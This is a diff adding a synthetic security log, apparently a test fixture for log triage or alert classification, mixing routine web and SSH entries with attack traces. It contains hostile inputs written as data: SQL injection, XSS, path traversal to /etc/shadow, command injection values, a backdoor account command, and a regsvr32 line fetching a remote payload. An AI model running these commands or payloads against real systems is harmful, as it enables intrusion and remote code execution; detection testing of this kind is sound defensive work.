@@ -1,0 +1,49 @@
+[2024-03-15 01:23:44] INFO sshd Failed password for invalid user admin from 192.168.1.100 port 52341 ssh2
+[2024-03-15 01:23:46] INFO sshd Failed password for invalid user root from 192.168.1.100 port 52342 ssh2
+[2024-03-15 01:23:48] INFO sshd Failed password for invalid user admin from 192.168.1.100 port 52343 ssh2
+[2024-03-15 01:23:50] INFO sshd Failed password for invalid user ubuntu from 192.168.1.100 port 52344 ssh2
+[2024-03-15 02:10:05] INFO apache 10.0.0.42 GET /index.php?id=1' OR '1'='1 -> HTTP 200
+[2024-03-15 02:10:07] INFO apache 10.0.0.42 GET /index.php?id=1 UNION SELECT username,password FROM users-- -> HTTP 500
+[2024-03-15 02:10:09] WARN apache 10.0.0.42 GET /login?user=<script>alert('xss')</script> -> HTTP 400
+[2024-03-15 03:45:12] INFO firewall Port scan detected from 203.0.113.55 targeting ports 22,80,443,3306,5432
+[2024-03-15 03:45:14] INFO ids Nmap scan detected from 203.0.113.55
+[2024-03-15 03:47:00] WARN apache 203.0.113.55 GET /.env -> HTTP 404
+[2024-03-15 03:47:01] WARN apache 203.0.113.55 GET /wp-admin/ -> HTTP 403 access denied
+[2024-03-15 03:47:02] WARN apache 203.0.113.55 GET /phpmyadmin/ -> HTTP 403 forbidden
+[2024-03-15 04:02:30] CRITICAL edr C2 beacon pattern detected - host WIN-PC04 contacting 185.220.101.7 (known cobalt strike C2)
+[2024-03-15 04:03:15] CRITICAL edr Meterpreter session established from WIN-PC04
+[2024-03-15 04:05:00] CRITICAL edr Suspicious process execution: powershell.exe -enc SQBFAFgA...
+[2024-03-15 04:05:30] CRITICAL edr cmd.exe /c whoami && net user hacker P@ssw0rd /add
+[2024-03-15 04:15:44] CRITICAL edr Ransomware indicator: bulk file rename to .encrypted extension detected on \\fileserver\shares
+[2024-03-15 04:15:45] CRITICAL edr readme_to_decrypt.txt created in 14 directories
+[2024-03-15 05:00:01] HIGH transfer Data exfiltration suspected: 250mb upload to 185.220.101.8 over port 443
+[2024-03-15 05:10:10] HIGH dns DNS tunneling suspected: dnscat2 tool signatures detected in DNS queries
+[2024-03-15 06:30:00] CRITICAL auth Privilege escalation detected: user www-data ran sudo su successfully
+[2024-03-15 06:30:10] HIGH auth Root login accepted from 10.0.0.99 via SSH
+[2024-03-15 08:00:00] INFO apache 172.16.0.5 GET /index.html -> HTTP 200 (1024 bytes)
+[2024-03-15 08:01:00] INFO apache 172.16.0.5 GET /about.html -> HTTP 200 (980 bytes)
+[2024-03-15 08:02:00] INFO apache 172.16.0.6 POST /api/login -> HTTP 200 (500 bytes)
+[2024-03-15 09:15:00] WARN apache 198.51.100.7 GET /admin/../../../etc/passwd -> HTTP 400
+[2024-03-15 09:15:01] WARN apache 198.51.100.7 GET /..%2F..%2Fetc%2Fshadow -> HTTP 400
+[2024-03-15 10:20:00] INFO apache 172.16.0.10 GET /search?q=hello -> HTTP 200 (2048 bytes)
+[2024-03-15 10:20:05] WARN apache 172.16.0.10 GET /search?q=;cat /etc/passwd -> HTTP 500 internal server error
+[2024-03-15 11:00:00] INFO sshd Failed password for user deploy from 91.108.4.33 port 44200 ssh2
+[2024-03-15 11:00:02] INFO sshd Login failed for user deploy from 91.108.4.33
+[2024-03-15 11:00:04] INFO sshd Account locked: too many attempts for user deploy from 91.108.4.33
+[2024-03-15 12:30:00] INFO apache 172.16.0.20 GET /dashboard -> HTTP 200 (8192 bytes)
+[2024-03-15 13:00:00] WARN ids sqlmap user-agent detected from 5.188.206.14
+[2024-03-15 13:00:05] WARN ids GoBuster directory enumeration from 5.188.206.14
+[2024-03-15 14:00:00] INFO sshd Accepted publickey for devops from 172.16.0.50 port 33901 ssh2
+[2024-03-15 14:01:00] INFO syslog session opened for user devops by pam
+[2024-03-15 15:00:00] INFO apache 172.16.0.6 GET /api/health -> HTTP 200 (128 bytes)
+[2024-03-15 16:00:00] WARN apache 10.0.0.42 POST /api/exec?cmd=`whoami` -> HTTP 400
+[2024-03-15 16:00:05] WARN apache 10.0.0.42 POST /api/exec?cmd=$(id) -> HTTP 400
+[2024-03-15 17:30:00] INFO apache 172.16.0.5 GET /reports/q1.pdf -> HTTP 200 (102400 bytes)
+[2024-03-15 23:58:10] INFO sshd Accepted password for admin from 10.10.10.200 port 55100 ssh2
+[2024-03-15 23:58:11] INFO syslog session opened for user admin - login accepted
+[2024-03-16 00:05:00] INFO sshd Accepted password for backup from 10.10.10.201 port 55200 ssh2
+[2024-03-16 00:05:01] INFO syslog session opened for user backup - login accepted
+[2024-03-16 02:44:00] INFO auth pass-the-hash attack detected targeting DOMAIN\svcaccount
+[2024-03-16 02:44:05] CRITICAL auth Token impersonation detected on WIN-DC01
+[2024-03-16 03:00:00] INFO edr mshta.exe spawned by winword.exe on LAPTOP-SALES3 (suspicious)
+[2024-03-16 03:00:10] INFO edr regsvr32 /s /u /i:http://185.220.101.9/payload.sct scrobj.dll
